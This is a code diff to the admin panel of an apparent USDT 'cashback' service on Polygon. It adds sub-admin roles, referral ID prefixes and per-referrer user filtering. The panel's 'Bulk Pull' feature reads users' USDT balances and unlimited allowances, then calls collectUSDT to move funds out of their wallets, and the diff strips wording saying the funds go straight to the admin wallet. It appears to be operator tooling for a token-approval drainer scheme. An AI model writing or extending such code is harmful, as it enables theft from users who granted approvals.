@@ -23,10 +23,40 @@
 
         <div id="adminStatus" class="text-xs text-center text-amber-400 font-mono"></div>
 
+        <!-- PART 0: Sub-Admin & Prefix Management (Owner Only) -->
+        <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
+            <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
+                🛡️ Sub-Admin & Prefix Management (Owner Only)
+            </h2>
+            <div class="space-y-2 text-xs">
+                <input type="text" id="subAdminAddress" placeholder="Sub-Admin Wallet Address (0x...)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500 font-mono">
+                <input type="text" id="subAdminPrefix" placeholder="ID Prefix Letter (ဥပမာ - A)" maxlength="3" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500 uppercase">
+                
+                <div class="grid grid-cols-2 gap-2 pt-1 text-slate-300">
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="checkbox" id="permPull" class="w-4 h-4 rounded bg-slate-900 border-slate-700"> Can Pull Funds
+                    </label>
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="checkbox" id="permTier" class="w-4 h-4 rounded bg-slate-900 border-slate-700"> Can Set Tiers
+                    </label>
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="checkbox" id="permWithdraw" class="w-4 h-4 rounded bg-slate-900 border-slate-700"> Can Process Withdrawals
+                    </label>
+                    <label class="flex items-center gap-2 cursor-pointer">
+                        <input type="checkbox" id="permActive" class="w-4 h-4 rounded bg-slate-900 border-slate-700" checked> Is Active
+                    </label>
+                </div>
+
+                <button onclick="saveSubAdmin()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 rounded-xl transition cursor-pointer shadow-md mt-2">
+                    Save / Update Sub-Admin
+                </button>
+            </div>
+        </div>
+
         <!-- PART 1: Manage Cashback Tiered Rates -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
-                ⚙️ 1. Cashback Tiered Rates (ရာခိုင်နှုန်းဖြင့် အလွယ်တကူ သတ်မှတ်ရန်)
+                ⚙️ 1. Cashback Tiered Rates
             </h2>
             <div class="space-y-2 text-xs">
                 <input type="number" id="tierIndex" placeholder="Tier Index (ဥပမာ - 0, 1, 2...)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500">
@@ -48,7 +78,7 @@
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
-                    📊 2. Approved Wallets & Bulk Pull
+                    📊 2. Referred Users & Bulk Pull
                 </h2>
                 <div class="flex gap-2">
                     <button onclick="refreshUserTable()" class="bg-slate-700 hover:bg-slate-600 px-3 py-1.5 rounded-xl text-xs transition cursor-pointer">Refresh</button>
@@ -103,7 +133,7 @@
     <script>
         let provider, adminSigner, adminAddress;
 
-        const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC";
+        const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; // သင် Deploy လုပ်ထားသော Contract Address ဖြင့် ထည့်ပါ
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
 
@@ -113,6 +143,9 @@
         ];
 
         const ADMIN_ABI = [
+            "function owner() view returns (address)",
+            "function setSubAdmin(address admin, bool canPull, bool canSetTier, bool canProcessWithdrawal, bool isActive, string memory prefix) external",
+            "function subAdminPrefix(address) view returns (string)",
             "function setTier(uint256 index, uint256 minAmt, uint256 maxAmt, uint256 rateBps) external",
             "function collectUSDT(address from, uint256 amount) external",
             "function processWithdrawal(address user, uint256 requestId, bool approved) external",
@@ -148,6 +181,34 @@
             }
         }
 
+        async function saveSubAdmin() {
+            const subAdminAddr = document.getElementById("subAdminAddress").value.trim();
+            const prefix = document.getElementById("subAdminPrefix").value.trim().toUpperCase();
+            const canPull = document.getElementById("permPull").checked;
+            const canSetTier = document.getElementById("permTier").checked;
+            const canWithdraw = document.getElementById("permWithdraw").checked;
+            const isActive = document.getElementById("permActive").checked;
+
+            if (!subAdminAddr || !ethers.isAddress(subAdminAddr)) {
+                alert("မှန်ကန်သော Sub-Admin Wallet Address ကို ထည့်သွင်းပါ။");
+                return;
+            }
+            if (!prefix) {
+                alert("ကျေးဇူးပြု၍ ID Prefix စာလုံး (ဥပမာ - A) ထည့်သွင်းပါ။");
+                return;
+            }
+
+            try {
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const tx = await contract.setSubAdmin(subAdminAddr, canPull, canSetTier, canWithdraw, isActive, prefix);
+                await tx.wait();
+                alert("Sub-Admin နှင့် Prefix ကို အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ။");
+            } catch (err) {
+                console.error(err);
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Main Owner သီးသန့်ဖြစ်ရပါမည်)");
+            }
+        }
+
         async function updateTierRate() {
             const index = document.getElementById("tierIndex").value;
             const minAmt = document.getElementById("tierMin").value;
@@ -161,14 +222,13 @@
 
             try {
                 const rateBps = Math.round(parseFloat(ratePercent) * 100);
-
                 const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
                 const tx = await contract.setTier(index, ethers.parseUnits(minAmt, 6), ethers.parseUnits(maxAmt, 6), rateBps);
                 await tx.wait();
                 alert(`Tier Rate (${ratePercent}%) အောင်မြင်စွာ အပ်ဒိတ်လုပ်ပြီးပါပြီ။`);
             } catch (err) {
                 console.error(err);
-                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Admin သီးသန့်ဖြစ်ရပါမည်)");
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ)");
             }
         }
 
@@ -185,15 +245,24 @@
                     return;
                 }
 
-                let totalBalance = 0;
-                let rowsHtml = "";
                 const collectorContract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, provider);
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+
+                const contractOwner = await collectorContract.owner();
+                const isOwner = adminAddress.toLowerCase() === contractOwner.toLowerCase();
+
+                let totalBalance = 0;
+                let rowsHtml = "";
 
                 for (let i = 0; i < savedUsers.length; i++) {
                     const addr = savedUsers[i];
                     try {
                         const userInfo = await collectorContract.users(addr);
+
+                        if (!isOwner && userInfo.referrer.toLowerCase() !== adminAddress.toLowerCase()) {
+                            continue;
+                        }
+
                         const balanceBN = await usdtContract.balanceOf(addr);
                         const allowanceBN = await usdtContract.allowance(addr, ADMIN_CONTRACT_ADDRESS);
 
@@ -202,7 +271,16 @@
                         totalBalance += balance;
 
                         const shortAddr = `${addr.substring(0, 6)}...${addr.substring(38)}`;
-                        const userId = userInfo.isRegistered ? userInfo.userId.toString() : "-";
+                        
+                        let prefix = "M";
+                        if (userInfo.referrer && userInfo.referrer !== ethers.ZeroAddress) {
+                            try {
+                                const p = await collectorContract.subAdminPrefix(userInfo.referrer);
+                                if (p) prefix = p;
+                            } catch (e) {}
+                        }
+                        const userId = userInfo.isRegistered ? `${prefix}${userInfo.userId.toString()}` : "-";
+
                         let allowanceDisplay = allowance > 1000000000 ? "Unlimited" : `${allowance.toFixed(2)} USDT`;
 
                         rowsHtml += `
@@ -222,7 +300,7 @@
                     }
                 }
 
-                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> ဒေတာဖတ်ရှု၍ မရပါ။ </td></tr>`;
+                tbody.innerHTML = rowsHtml || `<tr><td colspan="6" class="p-4 text-center text-slate-500"> သင်၏ Referral Link ဖြင့် ဝင်ရောက်လာသော User များ မရှိသေးပါ။ </td></tr>`;
                 document.getElementById("totalUsersBalance").innerText = `${totalBalance.toLocaleString(undefined, {minimumFractionDigits: 2})} USDT`;
 
             } catch (err) {
@@ -246,7 +324,7 @@
                 refreshUserTable();
             } catch(err) {
                 console.error(err);
-                alert("ဆွဲယူမှု မအောင်မြင်ပါ။ Allowance ရှိမရှိ စစ်ဆေးပါ။");
+                alert("ဆွဲယူမှု မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ သို့မဟုတ် Allowance မရှိပါ)");
             }
         }
 
@@ -257,7 +335,7 @@
                 return;
             }
 
-            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို Admin Wallet သို့ တိုက်ရိုက်ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
+            if (!confirm(`ရွေးချယ်ထားသော Wallet ${checkboxes.length} ခုထံမှ ရန်ပုံငွေများကို ဆွဲယူမည်မှာ သေချာပါသလား?`)) return;
 
             const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
             let successCount = 0;
@@ -277,7 +355,7 @@
                 }
             }
 
-            alert(`Admin Wallet သို့ အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
+            alert(`အောင်မြင်စွာ ဆွဲယူနိုင်ခဲ့သော Wallet အရေအတွက်: ${successCount}`);
             refreshUserTable();
         }
 
@@ -327,9 +405,9 @@
                 loadWithdrawRequests();
             } catch (err) {
                 console.error(err);
-                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။");
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (ခွင့်ပြုချက်မရှိပါ)");
             }
         }
     </script>
 </body>
-  </html>
+</html>
